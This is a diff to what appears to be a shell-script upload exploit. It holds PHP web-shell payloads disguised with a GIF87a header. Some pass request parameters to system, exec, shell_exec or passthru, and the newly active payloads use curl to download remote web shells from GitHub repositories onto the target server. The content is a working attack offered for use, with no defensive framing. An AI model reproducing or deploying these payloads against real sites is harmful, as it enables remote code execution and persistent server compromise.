@@ -14,7 +14,9 @@ fi
 
 # if a payload doesn't work, try another
 
-payload='GIF87a<?php echo system($_REQUEST[0]); ?>'
+#payload='GIF87a<?php echo system($_REQUEST[0]); ?>'
+#payload='GIF87a<?php $ch = curl_init("https://raw.githubusercontent.com/Chocapikk/Shells/main/tesla.php");$fp = fopen("tesla.php", "wb");curl_setopt($ch, CURLOPT_FILE, $fp);curl_setopt($ch, CURLOPT_HEADER, 0);curl_exec($ch);curl_close($ch);fclose($fp);?>'
+payload='GIF87a<?php $ch = curl_init("https://raw.githubusercontent.com/trhacknon/0xa/main/trknish.php");$fp = fopen("trknish.php", "wb");curl_setopt($ch, CURLOPT_FILE, $fp);curl_setopt($ch, CURLOPT_HEADER, 0);curl_exec($ch);curl_close($ch);fclose($fp);?>'
 #payload='GIF87a<?php echo exec($_REQUEST[0]); ?>'
 #payload='GIF87a<?php echo shell_exec($_REQUEST[0]); ?>'
 #payload='GIF87a<?php echo passthru($_REQUEST[0]); ?>'
@@ -69,6 +71,7 @@ writePayload(){
 	tmpfile=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 5)".php"
 	file=`basename $tmpfile`
 	echo "$1" > $tmpfile
+        echo $tmpfile
 }
 
 banner(){
